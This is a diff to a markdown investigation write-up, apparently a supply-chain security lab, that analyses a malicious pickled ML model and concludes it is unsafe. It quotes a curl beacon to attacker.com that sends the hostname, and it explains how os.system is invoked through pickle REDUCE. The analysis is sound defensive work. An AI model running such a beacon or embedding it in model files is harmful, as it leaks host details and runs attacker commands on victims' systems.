@@ -80,10 +80,14 @@ python3 -m pickletools models/production_model.pkl
 
 The original model provided a baseline for comparison.
 
+<img src="./images/pl1.png" />
+
 The production model contained suspicious operations, including:
 
 - `os.system`
 - A `curl` command targeting `http://attacker.com/beacon`
+
+<img src="./images/pl2.png" />
 
 The command was structured to send the host's identity using:
 
@@ -91,27 +95,23 @@ The command was structured to send the host's identity using:
 curl "http://attacker.com/beacon" -d "host=$(hostname)"
 ```
 
-This was a significant finding.
-
 The use of `os.system` allows execution of operating-system commands. In the context of Python pickle deserialization, callable objects can be invoked through pickle operations such as `REDUCE`.
 
-The presence of a shell command making an external request was not expected model behavior.
-
-More importantly, the destination matched the external domain observed in the network logs and the SOC alert.
+The presence of a shell command making an external request was not expected model behavior. More importantly, the destination matched the external domain observed in the network logs and the SOC alert.
 
 I then used the provided safe analysis script:
 
 ```bash
 python3 /opt/supply-chain/tools/safe_analysis.py models/production_model.pkl
 ```
+<img src="./images/pl3.png" />
 
-The script identified dangerous pickle operations involving `os.system` and the suspicious `curl` command.
-
-It returned an `UNSAFE` verdict.
+The script identified dangerous pickle operations involving `os.system` and the suspicious `curl` command. It returned an `UNSAFE` verdict.
 
 The combination of the static analysis findings and the correlated network activity provided strong evidence that the production model contained malicious functionality.
 
 **Finding:** The production model was unsafe and should not remain in service.
+
 
 ### 2.3 Examining suspicious dependencies
 
